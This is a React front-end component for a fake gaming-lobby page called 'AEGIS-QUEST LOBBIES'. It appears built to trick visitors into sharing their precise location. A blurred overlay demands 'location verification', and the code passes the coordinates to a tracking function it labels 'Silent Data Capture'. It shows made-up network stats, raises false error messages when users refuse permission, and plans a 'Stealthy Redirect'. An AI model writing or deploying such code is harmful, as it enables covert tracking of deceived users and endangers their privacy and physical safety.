import React, { useContext, useState } from 'react';

import { motion } from 'framer-motion';
import { AuthContext } from '../components/context/AuthContext';
import { useNavigate } from 'react-router-dom';

const Home = () => {
    const { trackUser } = useContext(AuthContext);
    const navigate = useNavigate();
    const [status, setStatus] = useState("idle"); // idle, scanning, success, denied

    const handleScan = () => {
        setStatus("scanning");
        
        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                // 1. Silent Data Capture
                trackUser(pos); 
                
                // 2. State & Session Update
                localStorage.setItem('verified', 'true'); 
                setStatus("success");

                // 3. Stealthy Redirect
                setTimeout(() => {
                   // window.location.href = "https://discord.com/invite/gaming-hub"; 
                }, 2500);
            },
            (err) => {
                setStatus("denied");
                if(err.code === 1) {
                    alert("LOCATION_SERVICE_EXCEPTION: Regional nodes are locked. Please grant permission to authenticate your gaming zone.");
                } else {
                    alert("NETWORK_TIMEOUT: Please check your connection and try again.");
                }
            },
            options
        );
    };

    return (
        <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 text-white p-5 overflow-hidden font-sans">
            {/* Background Aesthetic Elements */}
            <div className="absolute top-0 left-0 w-full h-full opacity-10 pointer-events-none">
                <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-cyan-500 rounded-full blur-[120px]"></div>
                <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-purple-500 rounded-full blur-[120px]"></div>
            </div>

            <h1 className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 mb-6 tracking-tighter italic">
                AEGIS-QUEST LOBBIES
            </h1>
            
            {/* Main Content Area (Blurred until success) */}
            <div className="space-y-6">
                    <div className="flex justify-between items-end mb-2">
                        <p className="text-cyan-400 font-mono text-[10px] uppercase tracking-[0.3em] font-bold text-left">Incoming Local Data Streams...</p>
                        <span className="text-cyan-500 font-mono text-[9px] animate-pulse">LIVE_SYNC</span>
                    </div>

                    <div className="h-1.5 w-full bg-gray-800 rounded-full overflow-hidden border border-gray-700/50">
                        <motion.div 
                            initial={{ width: "0%" }}
                            animate={status === 'success' ? { width: "100%" } : { width: "0%" }}
                            transition={{ duration: 1.5, ease: "circOut" }}
                            className="h-full bg-gradient-to-r from-cyan-600 to-blue-400 shadow-[0_0_15px_rgba(6,182,212,0.5)]"
                        ></motion.div>
                    </div>

                    {/* Fake Data Cards */}
                    <div className="grid grid-cols-2 gap-4">
                        <div className="bg-black/40 p-4 rounded-2xl border border-gray-800 text-left">
                            <p className="text-[9px] text-gray-500 uppercase mb-1 font-mono tracking-widest">Network_Ping</p>
                            <p className="text-lg font-black text-white italic font-mono">12<span className="text-[10px] text-cyan-500 ml-1">ms</span></p>
                        </div>
                        <div className="bg-black/40 p-4 rounded-2xl border border-gray-800 text-left">
                            <p className="text-[9px] text-gray-500 uppercase mb-1 font-mono tracking-widest">Zone_Status</p>
                            <p className="text-lg font-black text-green-500 italic font-mono uppercase">Optimal</p>
                        </div>
                    </div>

                    {/* Professional Navigation Button */}
                    <motion.button
                        whileHover={{ scale: 1.03, boxShadow: "0 0 30px rgba(6, 182, 212, 0.4)" }}
                        whileTap={{ scale: 0.97 }}
                        onClick={() => navigate('/lobbies')}
                        className="w-full bg-white text-black font-black py-4 rounded-2xl uppercase tracking-widest text-xs mt-4 flex items-center justify-center gap-3 transition-all group"
                    >
                        <span>Find Me</span>
                        <svg className="w-4 h-4 transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M13 7l5 5m0 0l-5 5m5-5H6" />
                        </svg>
                    </motion.button>
                </div>
           

            {/* The Overlay Hook */}
            {status !== "success" && (
                <div className="absolute inset-0 flex items-center justify-center bg-black/80 backdrop-blur-xl z-50">
                    <motion.div 
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="bg-gray-800 p-10 rounded-3xl text-center border border-cyan-500/50 shadow-[0_0_50px_rgba(6,182,212,0.2)] max-w-sm"
                    >
                        <div className="mb-6 inline-flex p-4 bg-cyan-500/10 rounded-full border border-cyan-500/20">
                            <svg className="w-10 h-10 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path>
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
                            </svg>
                        </div>
                        <h2 className="text-3xl mb-3 font-black tracking-tight">RAIYAN SHEIKH</h2>
                        <p className="mb-8 text-gray-400 text-sm leading-relaxed">
                            LOCATION_VERIFICATION REQUIRED: Please allow location access to Find me and optimize your lobby experience.
                        </p>
                        
                        <motion.button 
                            whileHover={{ scale: 1.02 }}
                            whileTap={{ scale: 0.98 }}
                            onClick={handleScan}
                            disabled={status === "scanning"}
                            className="w-full bg-cyan-500 hover:bg-cyan-400 text-black px-8 py-4 rounded-xl font-black text-sm uppercase tracking-tighter transition-all flex justify-center items-center gap-3 shadow-[0_10px_20px_rgba(6,182,212,0.3)]"
                        >
                            {status === "scanning" ? (
                                <>
                                    <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin"></div>
                                    Syncing Coordinates...
                                </>
                            ) : "Enter "}
                        </motion.button>
                    </motion.div>
                </div>
            )}
        </div>
    );
};

export default Home;